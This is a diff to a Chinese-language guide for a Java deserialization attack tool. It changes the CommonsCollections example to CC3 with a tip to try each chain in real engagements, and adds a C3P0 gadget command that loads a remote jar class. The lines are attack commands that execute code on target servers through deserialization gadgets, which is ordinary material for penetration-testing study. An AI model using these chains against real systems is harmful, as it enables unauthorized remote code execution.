@@ -511,10 +511,10 @@ CommonsCollections利用链能被Java反序列化利用的原因是其中的Tran
 
 描述：通过CommonsCollections依赖库中的InvokerTransformer来反射调用TemplatesImpl利用链从而触发代码执行。工具中的CommonsCollections2/CommonsCollections3/CommonsCollections4/CommonsCollections8/CommonsCollections10/CommonsCollections11/CommonsCollectionsK1都是TemplatesImpl利用链
 
-工具：以CommonsCollections2利用链来举例
+工具：以CommonsCollections3利用链来举例，实战中遇到CC321建议每个链都试一试，CC3加载TemplatesImpl利用链更稳定？？
 
 ```java
--m YsoAttack -g CommonsCollections2 -a "Templateslmpl:raw_cmd:calc"
+-m YsoAttack -g CommonsCollections3 -a "Templateslmpl:raw_cmd:calc"
 ```
 
 这里的raw_cmd参数可以替换为字节码执行的多种漏洞利用效果参数。
@@ -584,6 +584,7 @@ C3P0依赖下的Java反序列化有3种类型的攻击链：关于C3P0的些打�
 
 # c3p0:c3p0
 -m YsoAttack -g C3P02_c3p0 -a "http://127.0.0.1:2333/T32150077959500.jar|T32150077959500"
+-m YsoAttack -g C3P02_c3p0 -a "http://127.0.0.1:2333/EncryptionUtil.jar|ch.qos.logback.qd.EncryptionUtil"
 ```
 
 ##### C3P03 不出网Reference注入
